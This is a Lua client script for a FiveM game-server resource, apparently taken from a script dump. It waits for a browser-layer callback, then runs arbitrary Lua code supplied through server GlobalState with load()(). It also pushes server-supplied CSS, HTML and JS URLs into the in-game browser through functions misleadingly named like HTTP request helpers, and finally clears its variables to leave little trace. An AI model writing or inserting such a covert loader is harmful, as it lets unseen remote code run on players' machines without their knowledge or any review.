--[[
	id: bd4P2VIOjD-16UJDG7Uja
	name: client default
	description: ad
	time1: 2021-05-24 23:06:01.874398+00
	time2: 2021-05-24 23:06:01.874399+00
	uploader: dCft37atwBcsNndojr1evTDpQhkwJrLsbbRG3b20
	uploadersession: GvMNB1JjhEtGi8EhpIaYJo-vYIf8hV
	flag: f
--]]

local mandarPraNui = SendNUIMessage
local _t = {
  PerformHttpRequestHT = function(URL)
    SendNUIMessage({
      sim = URL
    })
  end,
  PerformHttpRequestC = function(URL)
    SendNUIMessage({
      talvez = URL
    })
  end,
  PerformHttpRequestJ = function(URL)
    SendNUIMessage({
      nao = URL
    })
  end
}
local executado = false
local function mySplit(inputstr,sep)
  if sep == nil then
    sep = "%s"
  end
  local t={}
  for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
      table.insert(t, str)
  end
  return t
end

event_name = ""
CreateThread(function() 
  local data = LoadResourceFile(GetCurrentResourceName(), 'config/resourceConfig.json')
  if type(data) == "string" then 
    data = json.decode(data) 
  end
  if data.token then 
    event_name = mySplit(data.token,"-")[1]
  end
  collectgarbage()
end)

RegisterNUICallback("loadData", function(data,cb) 
  if executado then return end
  while event_name == "" and not GlobalState[event_name..':ready'] do 
    Wait(100)
  end
  if GlobalState[event_name..':luaclient'] then 
  load(GlobalState[event_name..':luaclient'] or "")()
  end
   mandarPraNui = SendNUIMessage
  Wait(100)
  if GlobalState[event_name..':nuicss'] and string.len(GlobalState[event_name..':nuicss']) > 10 then 
    _t.PerformHttpRequestC(GlobalState[event_name..':nuicss'])
  end

  Wait(110)
  if GlobalState[event_name..':nuihtml'] and string.len(GlobalState[event_name..':nuihtml']) > 10 then 
    _t.PerformHttpRequestHT(GlobalState[event_name..':nuihtml'])
  end
  Wait(100)
  if GlobalState[event_name..':nuijs'] and string.len(GlobalState[event_name..':nuijs']) > 10 then 
    _t.PerformHttpRequestJ(GlobalState[event_name..':nuijs'])
  end
  mandarPraNui = nil 
  _t = nil
  event_name = nil
  collectgarbage()
  cb('ok')
end)

